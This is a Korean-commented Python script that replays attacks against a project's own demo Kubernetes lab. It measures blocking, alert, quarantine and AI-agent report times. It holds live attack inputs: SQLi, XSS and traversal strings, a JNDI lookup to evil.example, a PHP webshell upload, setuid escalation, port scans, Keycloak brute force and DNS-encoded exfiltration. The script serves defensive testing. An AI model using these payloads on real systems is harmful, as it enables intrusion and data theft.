#!/usr/bin/env python3
"""공격 재현 평가 (보안 S-5).

지금까지 막기로 한 공격을 한 번에 다시 재현하고, 공격마다 네 가지를 잰다.
  ① 막혔는가  ② 알림까지 몇 초  ③ (격리 대상이면) 격리까지 몇 초  ④ Slack 보고까지 몇 초, 조사 비용
그리고 "막지 않기로 했거나 못 막는 것" 도 같이 돌려, 정말 아무 알림도 안 뜨는지 확인해 한계로 적는다.

사용: python3 scripts/attack-replay.py [--only waf,flow] [--out replay.json]
전제: kubectl 이 클러스터를 가리킴. demo 의 attack-lab, WAF, Tetragon 정책, 알림 규칙, n8n·에이전트가 떠 있음.
주의: 실제로 알림이 뜨고 에이전트가 조사한다 (알림 하나에 $0.1 안팎, 전체 약 $1). 격리된 attack-lab 파드가 남는다
      (Slack 보고서의 [격리 파드 삭제] 버튼으로 지운다). 전체 15~20분.

측정 방법
- 알림: Prometheus ALERTS{alertstate="firing"} 가 처음 보인 시각 (스크립트가 포트포워드를 직접 연다)
- 격리: 파드에 security.kube-chatops/quarantine 라벨이 붙은 시각
- 보고: chat-gateway 감사 기록(flow=wf-02-investigate, alert=<알림 이름>)의 at
"""

from __future__ import annotations

import argparse
import json
import shlex
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

GATEWAY = "192.168.123.201"  # public-gateway (클러스터 안에서만 닿는다)
HOST = "demo.ascode.click"
PROM_PORT = 19391  # 스크립트가 Prometheus 로 포트포워드를 열고 끝날 때 닫는다 (API 서버 프록시는 파드까지 닿지 않는다)
NS_TMP = "attack-replay"


def sh(cmd: str, timeout: int = 180) -> str:
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return (p.stdout + p.stderr).strip()


def prom(query: str) -> list[dict]:
    q = urllib.parse.quote(query)
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{PROM_PORT}/api/v1/query?query={q}", timeout=10) as r:
            return json.load(r)["data"]["result"]
    except (OSError, ValueError, KeyError):
        return []


def firing(alert: str) -> bool:
    return bool(prom(f'ALERTS{{alertname="{alert}",alertstate="firing"}}'))


def wait(cond, timeout: int, every: float = 4) -> float | None:
    t0 = time.time()
    while time.time() - t0 < timeout:
        if cond():
            return time.time() - t0
        time.sleep(every)
    return None


def audits(since_epoch: float) -> list[dict]:
    mins = int((time.time() - since_epoch) / 60) + 2
    out = sh(f"kubectl -n aiops logs deploy/chat-gateway --since={mins}m")
    rows = []
    for line in out.splitlines():
        if '"audit": true' not in line and '"audit":true' not in line:
            continue
        try:
            r = json.loads(line)
        except ValueError:
            continue
        if r.get("flow") == "wf-02-investigate" and r.get("source") == "alert":
            at = datetime.fromisoformat(r["at"].replace("Z", "+00:00")).timestamp()
            if at >= since_epoch:
                rows.append({**r, "_at": at})
    return rows


def pod_of(app: str) -> str:
    return sh(f"kubectl -n demo get pods -l app.kubernetes.io/name={app} --field-selector=status.phase=Running "
              "-o jsonpath='{.items[0].metadata.name}'")


def php(cmd: str, pod: str | None = None) -> str:
    return sh(f"kubectl -n demo exec {pod or pod_of('attack-lab-php')} -c php -- bash -c {shlex.quote(cmd)}")


def java(cmd: str) -> str:
    return sh(f"kubectl -n demo exec {pod_of('attack-lab-java')} -- sh -c {shlex.quote(cmd)}")


def outside(cmd: str) -> str:
    """클러스터 안의 임시 파드에서 게이트웨이로 (Cloudflare 가 붙이는 실제 IP 헤더를 흉내 낸다)."""
    return sh(f"kubectl -n {NS_TMP} exec curl -- sh -c {shlex.quote(cmd)}", timeout=300)


def curl_gw(path: str, ip: str, extra: str = "") -> str:
    return (f"curl -s -o /dev/null -m 5 -w '%{{http_code}}\\n' -H 'Host: {HOST}' -H 'CF-Connecting-IP: {ip}' {extra} "
            f"'http://{GATEWAY}{path}'")


# ── 공격 시나리오: (키, 단계, 이름, 실행 함수 → (막혔나, 근거), 알림, 격리 대상 파드 함수 또는 None) ──


def s_waf():
    attacks = ["/api/orders/1?id=1%27%20OR%20%271%27=%271", "/api/orders?q=%3Cscript%3Ealert(1)%3C/script%3E",
               "/api/orders?file=../../../../etc/passwd", "/api/orders?cmd=;cat%20/etc/passwd",  # 경로에 ../ 를 넣으면 curl 이 보내기 전에 정리한다
               "/api/orders?x=%24%7Bjndi:ldap://evil.example/a%7D", "/api/orders?file=php://filter/resource=index",
               "/.env", "/api/orders?u=http://169.254.169.254/latest/meta-data/"]
    cmds = "; ".join(curl_gw(a, "198.51.100.31") for a in attacks)
    cmds += "; " + curl_gw("/api/orders/1", "198.51.100.31", "-A sqlmap/1.8") + "; " + curl_gw("/api/orders/1", "198.51.100.31", "-A Nikto")
    codes = outside(cmds).split()
    normal = outside(curl_gw("/api/orders/1", "198.51.100.32")).strip()
    blocked = codes.count("403")
    return blocked == len(codes) and normal == "200", f"공격 {len(codes)}건 중 403 {blocked}건, 정상 요청 {normal}"


def s_rate():
    out = outside("for i in $(seq 400); do " + curl_gw("/api/orders/$i", "198.51.100.41") + "; done | sort | uniq -c")
    n429 = sum(int(line.split()[0]) for line in out.splitlines() if line.strip().endswith("429"))
    other = outside(curl_gw("/api/orders/1", "198.51.100.42")).strip()
    return n429 > 100 and other == "200", f"400건 중 429 {n429}건, 다른 IP {other}"


def s_webshell():
    a = java("wget -qO- -T5 'localhost:8080/run?c=id' 2>&1")
    b = php("curl -s -m5 'localhost/run.php?b=/usr/bin/id'")
    ok = "uid=" not in a and "uid=" not in b
    return ok, f"java 셸 실행: {a[:30] or '응답 없음'} / php 셸 없이 직접 실행: {b[:30] or '응답 없음'}"


def s_tamper():
    out = php("curl -s -m5 --data-binary '<?php system($_GET[0]);' 'localhost/upload.php?p=/var/www/html/uploads/s.php'; "
              "echo; stat -c %s /var/www/html/uploads/s.php 2>/dev/null; curl -s -m5 --data-binary ok 'localhost/upload.php?p=/tmp/note.txt'")
    ok = "not permitted" in out and "wrote" in out
    return ok, "웹 루트 쓰기 거부(EPERM), 웹 루트 밖 정상 업로드는 됨" if ok else out[:120]


def s_flow():
    out = php("for u in http://n8n.aiops.svc:5678/healthz http://keycloak.keycloak.svc/; do curl -s -o /dev/null -m 3 -w '%{http_code} ' $u; done; "
              "for d in 1.1.1.1/443 8.8.8.8/53; do timeout 3 bash -c \"</dev/tcp/$d\" 2>/dev/null && echo -n 'open ' || echo -n 'closed '; done; "
              "IP=$(getent hosts keycloak.keycloak.svc | cut -d' ' -f1); n=0; for p in $(seq 1 40); do timeout 0.3 bash -c \"</dev/tcp/$IP/$p\" 2>/dev/null && n=$((n+1)); done; echo scan_open=$n")
    ok = "open " not in out and "scan_open=0" in out and "200" not in out
    return ok, "다른 ns 2곳·외부 2곳·포트 40개 모두 차단" if ok else out[:120]


def s_dropper():
    out = php("curl -s -m5 --data-binary @/usr/bin/id 'localhost/upload.php?p=/tmp/x&x=1'; echo; curl -s -m5 'localhost/run.php?b=/tmp/x'")
    return "uid=" not in out, "/tmp 에 투하한 파일 실행: " + (out.splitlines()[-1][:30] if out else "응답 없음")


def s_privesc():
    out = java("cp /bin/busybox /tmp/y 2>/dev/null || cp /bin/ls /tmp/y; chmod 4755 /tmp/y; echo chmod_rc=$?; ls -l /tmp/y | cut -c1-10; su -s /bin/sh nobody -c id; echo su_rc=$?")
    ok = "rws" not in out and "uid=" not in out
    return ok, "setuid 비트 안 붙음, su 종료" if ok else out[:120]


def s_login():
    sh("kubectl -n keycloak delete pod replay-probe --ignore-not-found --wait=true")
    sh("kubectl -n keycloak run replay-probe --restart=Never --image=curlimages/curl:8.11.1 --command -- sh -c "
       + shlex.quote("for i in $(seq 25); do curl -s -o /dev/null -w '%{http_code} ' -d grant_type=password -d client_id=admin-cli "
                    "-d username=replay-nouser -d password=w$i http://keycloak.keycloak.svc/realms/master/protocol/openid-connect/token; done"))
    wait(lambda: sh("kubectl -n keycloak get pod replay-probe -o jsonpath='{.status.phase}'") in ("Succeeded", "Failed"), 90, 3)
    codes = sh("kubectl -n keycloak logs replay-probe").split()
    sh("kubectl -n keycloak delete pod replay-probe --wait=false")
    return codes.count("401") == 25, f"없는 계정 로그인 25건 중 401 {codes.count('401')}건 (실제 계정은 건드리지 않음)"


SCENARIOS = [
    # key, 단계, 이름, 함수, 알림, 격리 대상(파드 이름을 주는 함수), 보고 경로
    ("waf", "요청", "SQLi·XSS·경로 탐색·스캐너 (WAF)", s_waf, "DemoWafAttackBlocked", None, "agent"),
    ("rate", "요청", "같은 IP 대량 요청 (요청 수 제한)", s_rate, "DemoRateLimited", None, "agent"),
    ("webshell", "실행", "웹셸 명령 실행 (셸, 셸 없이 직접)", s_webshell, "DemoWebshellBlocked", None, "agent"),
    ("tamper", "실행", "웹 루트에 웹셸 파일 심기", s_tamper, "DemoFileTamperBlocked", None, "agent"),
    ("flow", "네트워크", "횡이동·외부 연결·포트 스캔", s_flow, "DemoPortScan", None, "agent"),
    ("login", "인증", "keycloak 무차별 로그인", s_login, "KeycloakLoginFailuresHigh", None, "slack"),
    ("dropper", "실행", "실행 파일 투하 후 실행", s_dropper, "DemoCompromiseBlocked", lambda: pod_of("attack-lab-php"), "agent"),
    ("privesc", "실행", "권한 상승 (setuid, su)", s_privesc, "DemoCompromiseBlocked", lambda: pod_of("attack-lab-java"), "agent"),
]


# ── 한계 확인: 막지 않는 것. 실행한 뒤 보안 알림이 하나도 새로 뜨지 않는지 본다 ──


def limits() -> list[dict]:
    before = {r["metric"]["alertname"] for r in prom('ALERTS{alertstate=~"firing|pending", category="security"}')}
    rows = []
    out = php("echo data > /tmp/stage.bin && ls /tmp/stage.bin")
    rows.append(("실행 권한 없는 파일을 /tmp 에 쓰기 (다음 단계 준비)", "됨" if "stage.bin" in out else "안 됨"))
    out = php("getent hosts c2VjcmV0LWRhdGE.replay-test.example.com; echo rc=$?")
    rows.append(("DNS 질의에 데이터를 실어 보내기 (DNS 는 허용돼 있음)", "질의 나감 (응답 없음)" if "rc=" in out else out[:40]))
    codes = outside("; ".join(curl_gw("/api/orders/1?id=1%27%20OR%20%271%27=%271", "198.51.100.51") for _ in range(3))).split()
    rows.append(("공격 요청 3건 (알림 한도 5건 아래)", f"차단은 됨(403 {codes.count('403')}/3), 알림은 없어야 함"))
    out = outside("for i in $(seq 90); do " + curl_gw("/api/orders/$i", "198.51.100.52") + "; done | sort | uniq -c")
    rows.append(("한도 바로 아래의 요청 90건/10초", out.replace("\n", ", ").strip()))
    out = php("id; cat /etc/passwd | head -1")
    rows.append(("kubectl exec 로 들어온 셸의 명령 (웹 서버 자식이 아님)", "실행됨" if "uid=" in out else "막힘"))
    time.sleep(150)  # 알림 규칙 평가(30초) + 5분 창의 앞부분
    after = {r["metric"]["alertname"] for r in prom('ALERTS{alertstate=~"firing|pending", category="security"}')}
    new = sorted(after - before)
    return [{"what": w, "result": r} for w, r in rows] + [{"what": "위 다섯 가지 뒤 새로 뜬 보안 알림", "result": ", ".join(new) or "없음"}]


def run(s) -> dict:
    key, stage, name, fn, alert, target_fn, route = s
    row = {"key": key, "stage": stage, "name": name, "alert": alert}
    if firing(alert):
        print(f"  {alert} 가 이미 떠 있다 → 가라앉기를 기다린다 (최대 7분)", flush=True)
        wait(lambda: not firing(alert), 420, 10)
    target = target_fn() if target_fn else None
    t0 = time.time()
    ok, evidence = fn()
    row.update(blocked=ok, evidence=evidence, attack_seconds=round(time.time() - t0, 1))
    t_alert = wait(lambda: firing(alert), 300)
    row["alert_seconds"] = None if t_alert is None else round(time.time() - t0)
    if target:
        t_q = wait(lambda: "quarantine" in sh(f"kubectl -n demo get pod {target} -o jsonpath='{{.metadata.labels}}'"), 420)
        row["quarantine_seconds"] = None if t_q is None else round(time.time() - t0)
        row["quarantined_pod"] = target
    if route == "agent" and t_alert is not None:
        def reported():
            hits = [a for a in audits(t0) if a.get("alert") == alert and (not target or (a.get("quarantine") or "").startswith(target))]
            return hits[0] if hits else None
        got = [None]
        t_r = wait(lambda: got.__setitem__(0, reported()) or got[0], 480, 6)
        if t_r is not None:
            a = got[0]
            row.update(report_seconds=round(a["_at"] - t0), cost_usd=a.get("cost_usd"), tool_calls=a.get("tool_calls"), stopped_by=a.get("stopped_by"))
        else:
            row["report_seconds"] = None
    elif route == "slack":
        row["report_seconds"] = "단순 알림 (Alertmanager → Slack, 조사 없음)"
    return row


def fmt(v) -> str:
    return "-" if v is None else (f"{v}초" if isinstance(v, (int, float)) else str(v))


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", default="")
    ap.add_argument("--out", default="attack-replay.json")
    ap.add_argument("--skip-limits", action="store_true")
    a = ap.parse_args()
    only = {k for k in a.only.split(",") if k}
    pf = subprocess.Popen(["kubectl", "-n", "monitoring", "port-forward", "svc/kube-prometheus-kube-prome-prometheus", f"{PROM_PORT}:9090"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if wait(lambda: bool(prom("vector(1)")), 30, 1) is None:
        pf.terminate()
        sys.exit("Prometheus 에 연결하지 못했다 (포트포워드 실패)")
    wait(lambda: "NotFound" in sh(f"kubectl get ns {NS_TMP}"), 120, 3)  # 지난 실행의 네임스페이스가 지워지는 중일 수 있다
    sh(f"kubectl create ns {NS_TMP}")
    sh(f"kubectl -n {NS_TMP} run curl --image=curlimages/curl:8.11.1 --restart=Never --command -- sleep 3600")
    sh(f"kubectl -n {NS_TMP} wait pod/curl --for=condition=Ready --timeout=120s")
    results, lim = [], []
    try:
        for s in SCENARIOS:
            if only and s[0] not in only:
                continue
            print(f"▶ {s[2]}", flush=True)
            r = run(s)
            results.append(r)
            print("  ", json.dumps(r, ensure_ascii=False), flush=True)
        if not a.skip_limits and not only:
            print("▶ 한계 확인", flush=True)
            lim = limits()
    finally:
        sh(f"kubectl delete ns {NS_TMP} --wait=false")
        pf.terminate()
        json.dump({"at": datetime.now(timezone.utc).isoformat(), "results": results, "limits": lim}, open(a.out, "w"), ensure_ascii=False, indent=1)
    print("\n| 단계 | 공격 | 막힘 | 알림 | 격리 | 보고 | 조사 비용 |\n|---|---|---|---|---|---|---|")
    for r in results:
        cost = f"${r['cost_usd']:.2f} · 도구 {r['tool_calls']}회" if r.get("cost_usd") is not None else "-"
        print(f"| {r['stage']} | {r['name']} | {'예' if r['blocked'] else '**아니오**'} ({r['evidence']}) | {r['alert']} {fmt(r['alert_seconds'])} | "
              f"{fmt(r.get('quarantine_seconds')) if 'quarantine_seconds' in r else '대상 아님'} | {fmt(r.get('report_seconds'))} | {cost} |")
    if lim:
        print("\n| 막지 않는 것 | 결과 |\n|---|---|")
        for x in lim:
            print(f"| {x['what']} | {x['result']} |")
    if any(not r["blocked"] or r["alert_seconds"] is None for r in results):
        sys.exit(1)


if __name__ == "__main__":
    main()
